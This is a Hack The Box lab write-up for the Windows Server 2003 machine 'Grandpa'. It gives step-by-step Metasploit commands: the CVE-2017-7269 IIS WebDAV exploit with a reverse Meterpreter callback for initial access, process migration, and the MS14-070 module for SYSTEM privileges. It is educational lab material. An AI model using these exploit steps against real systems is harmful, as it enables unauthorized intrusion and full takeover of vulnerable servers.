# Hack The Box - Grandpa

> **Platform:** Hack The Box  
> **Machine:** Grandpa  
> **OS:** Windows Server 2003  
> **Focus:** WebDAV exploitation, Meterpreter process migration, Windows local privilege escalation

## Overview

Grandpa is a Legacy Windows Server running Microsoft IIS 6.0. Enumeration identified a vulnerable WebDAV service, which provided an initial Meterpreter foothold as `NT AUTHORITY\NETWORK SERVICE`.

The initial Meterpreter session had limitations that prevented several local privilege-escalation modules from operating correctly. After migrating Meterpreter into another process running under the same service account, the session became stable enough to use a Windows local privilege-escalation exploit and obtain `NT AUTHORITY\SYSTEM`.

> IP addresses, flags, hashes, and unnecessary identifying values have been omitted.

---

## Enumeration

I began with an Nmap scan of the target:

```bash
nmap -sC -sV -oA grandpa <TARGET_IP>
```

The scan identified Microsoft IIS 6.0 over HTTP.

<img width="1285" height="503" alt="image" src="https://github.com/user-attachments/assets/2db1fd4c-9036-48ea-9e46-02282792f102" />


The important finding was the legacy IIS/WebDAV environment, which is associated with **CVE-2017-7269**.

### Key Findings

- Microsoft IIS 6.0
- WebDAV enabled
- Windows Server 2003-era target
- CVE-2017-7269 applicable

---

## Initial Access

Metasploit contains a module for exploiting CVE-2017-7269:

```text
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
```

I configured the target and reverse connection information:

```text
set RHOSTS <TARGET_IP>
set LHOST <VPN_INTERFACE_IP>
run
```

The exploit successfully returned a Meterpreter session:

```text
meterpreter >
```
<img width="1382" height="461" alt="image" src="https://github.com/user-attachments/assets/7b37cbec-f4f7-4661-9ab3-5830d31a3d16" />

---

## Initial Security Context

I backgrounded Meterpreter and later returned to the session with:

```text
sessions -i 1
```

Attempting to identify the current user directly from Meterpreter resulted in an error:

```text
meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
```

However, spawning a native Windows shell worked:

```text
meterpreter > shell
```

From the Windows command prompt:

```cmd
whoami
```

Result:

```text
nt authority\network service
```
<img width="720" height="332" alt="image" src="https://github.com/user-attachments/assets/36ffc451-67b1-4b03-a397-bdf1ec6141c5" />

The initial foothold was therefore running as the IIS-related `NETWORK SERVICE` account.

---

## User Profile Access

Windows Server 2003 stores user profiles under:

```text
C:\Documents and Settings\
```

Listing the directory showed standard system profiles as well as the machine's user profile:

```cmd
dir "C:\Documents and Settings"
```

Attempting to enter the user's profile returned:

```text
Access is denied.
```

The current `NETWORK SERVICE` context did not have sufficient access, so privilege escalation was required.

---

## Privilege Escalation Enumeration

I returned to Meterpreter:

```cmd
exit
```

Then backgrounded the session:

```text
background
```

Metasploit's Local Exploit Suggester can evaluate the current session for possible local privilege-escalation paths:

```text
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

Several modules were reported as potentially applicable, including:

```text
exploit/windows/local/ms14_058_track_popup_menu
exploit/windows/local/ms14_070_tcpip_ioctl
exploit/windows/local/ms15_051_client_copy_image
exploit/windows/local/ppr_flatten_rec
exploit/windows/local/ms16_016_webdav
```

---
<img width="1307" height="522" alt="image" src="https://github.com/user-attachments/assets/35752e07-7da1-4b7c-a9e9-4443718f764a" />

## Troubleshooting the Meterpreter Session

Initially, attempts to run the suggested privilege-escalation modules failed with the same error:

```text
stdapi_sys_config_getsid: Operation failed: Access is denied.
```
<img width="992" height="88" alt="image" src="https://github.com/user-attachments/assets/4f2704d7-d657-4484-b552-c9e9c74047f5" />

After researching the error, I migrated Meterpreter into another process running as NETWORK SERVICE. This provided a more stable token/process context, allowing the SID query to succeed and the local exploit to continue.

I returned to the Meterpreter session:

```text
sessions -i 1
```

Then enumerated running processes:

```text
ps
```

Several processes were running as:

```text
NT AUTHORITY\NETWORK SERVICE
```

Rather than remaining inside the original IIS/WebDAV process, I migrated Meterpreter into another process owned by the same account.

<img width="1080" height="666" alt="image" src="https://github.com/user-attachments/assets/d53a1d34-d616-4c12-aac2-abc0aa166d7a" />

Example:

```text
migrate <NETWORK_SERVICE_PID>
```

After migration:

```text
getuid
```

successfully returned:

```text
Server username: NT AUTHORITY\NETWORK SERVICE
```

This confirmed that the migrated Meterpreter session was functioning correctly.

### Lesson Learned 

A working shell does not necessarily mean every Meterpreter API function is operating correctly.

When several post-exploitation modules fail on calls such as:

```text
stdapi_sys_config_getsid
stdapi_sys_config_getuid
```

process migration can provide a cleaner Meterpreter execution context without changing the account privileges.

---

## Privilege Escalation

With the stabilized Meterpreter session, I backgrounded it again:

```text
background
```

I selected the MS14-070 local privilege-escalation module:

```text
use exploit/windows/local/ms14_070_tcpip_ioctl
```

The module identified the target as:

```text
Windows Server 2003 SP2
```

I configured the existing session and callback:

```text
set SESSION 1
set LHOST <VPN_INTERFACE_IP>
set LPORT <LISTEN_PORT>
run
```

The exploit succeeded:

```text
[+] Exploitation successful!
[*] Meterpreter session 2 opened
```

I verified the new security context:

```text
getuid
```

Result:

```text
Server username: NT AUTHORITY\SYSTEM
```

A native shell confirmed the same result:

```text
shell
whoami
```

```text
nt authority\system
```

Privilege escalation was complete.

<img width="1285" height="557" alt="image" src="https://github.com/user-attachments/assets/76ee0d80-2f4d-4966-b59f-e90afc5d31fd" />


---

## Flags

With `SYSTEM` privileges, the previously restricted user and administrator profile directories were accessible.

The flags were retrieved from the appropriate desktop directories:

```cmd
dir "C:\Documents and Settings\<USER>\Desktop"
type "C:\Documents and Settings\<USER>\Desktop\user.txt"
```

```cmd
dir "C:\Documents and Settings\Administrator\Desktop"
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

Flag values omitted.

---

## Attack Path

```text
Nmap Enumeration
        |
        v
IIS 6.0 / WebDAV Identified
        |
        v
CVE-2017-7269
        |
        v
Meterpreter Foothold
        |
        v
NT AUTHORITY\NETWORK SERVICE
        |
        v
Local Exploit Suggester
        |
        v
Meterpreter SID/API Errors
        |
        v
Process Enumeration
        |
        v
Migrate Into Another NETWORK SERVICE Process
        |
        v
MS14-070 TCP/IP IOCTL
        |
        v
NT AUTHORITY\SYSTEM
```

---

## Key Takeaways

- Legacy IIS/WebDAV services should receive close attention during enumeration.
- `post/multi/recon/local_exploit_suggester` is useful for identifying candidate Windows privilege-escalation modules.
- A Metasploit module reporting that a target appears vulnerable does not guarantee successful exploitation.
- Repeated `stdapi` access errors across unrelated modules can indicate a Meterpreter session/process problem.
- Migrating into another process running under the same account can stabilize Meterpreter without requiring additional privileges.
- Confirm privilege escalation with both Meterpreter and native operating-system commands when possible.


## Vulnerabilities Used

### CVE-2017-7269

A buffer overflow affecting the WebDAV implementation in Microsoft IIS 6.0. It was used to obtain the initial remote code-execution foothold.

### MS14-070

A Windows TCP/IP local privilege-escalation vulnerability affecting older Windows systems. It was used from the established Meterpreter session to elevate from `NETWORK SERVICE` to `SYSTEM`.

---

## Disclaimer

This write-up documents exploitation performed against an authorized Hack The Box lab environment. The techniques described here are intended for cybersecurity education, lab practice, and defensive understanding.
